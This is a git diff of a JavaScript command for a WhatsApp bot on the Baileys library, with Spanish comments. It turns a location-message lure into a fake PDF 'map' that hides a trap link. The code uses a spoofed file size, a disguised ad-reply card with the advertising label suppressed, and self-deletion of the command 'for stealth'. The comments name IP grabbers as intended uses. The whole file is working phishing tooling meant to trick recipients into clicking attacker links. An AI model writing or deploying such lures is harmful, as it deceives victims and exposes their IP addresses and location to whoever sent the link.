@@ -1,30 +1,36 @@
 export default {
-    name: 'geofishing_exploit',
-    match: (text) => /^\.gps/i.test(text),
+    name: 'documento_trampa',
+    match: (text) => /^\.file/i.test(text),
     execute: async ({ sock, remitente, msg, textoLimpio }) => {
         
-        // Uso: .gps https://tu-link-trampa.com (grabber de IPs, rickroll, etc)
-        const linkTrampa = textoLimpio.replace(/^\.gps\s*/i, '').trim() || "https://pornhub.com";
+        const linkTrampa = textoLimpio.replace(/^\.file\s*/i, '').trim() || "https://tu-link.com";
 
         try {
-            // Sigilo: borramos el comando de tu pantalla
+            // Sigilo
             try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}
 
-            // EXPLOIT: Inyección del contenedor LocationMessage
+            // EXPLOIT: Usamos el contenedor de documento para evitar la URL gris
             await sock.sendMessage(remitente, {
-                location: {
-                    // Coordenadas reales (Ej: Zona de Gran Canaria) para renderizar el mapa
-                    degreesLatitude: 27.8440, 
-                    degreesLongitude: -15.4385,
-                    name: "Centro de Alto Rendimiento", // Título principal de confianza
-                    address: "Ver ruta principal", // Subtítulo gris
-                    url: linkTrampa // <--- El punto ciego de seguridad de Meta
+                document: { url: 'https://raw.githubusercontent.com/filipe-ps/Baileys/master/README.md' }, // Un archivo ligero cualquiera
+                mimetype: 'application/pdf',
+                fileName: 'MAPA_ACCESO_UBICACION.pdf', // Nombre que verá la víctima
+                fileLength: 999999999, // Tamaño falso para que parezca pesado/importante
+                caption: 'Haz clic para abrir el mapa detallado.',
+                contextInfo: {
+                    externalAdReply: {
+                        title: '📍 UBICACIÓN EN TIEMPO REAL',
+                        body: 'Pulsa para ver la ruta en el mapa',
+                        mediaType: 1,
+                        thumbnail: Buffer.alloc(0), // Aquí podrías poner un mapa real en base64
+                        sourceUrl: linkTrampa, // El link trampa real
+                        renderLargerThumbnail: true,
+                        showAdAttribution: false // Evita que aparezca la etiqueta de "Publicidad"
+                    }
                 }
             });
 
         } catch (err) {
-            console.error("Error en GPS Spoof:", err);
-            // Sin alertas en el chat para mantener la limpieza
+            console.error("Error File Trap:", err);
         }
     }
 };
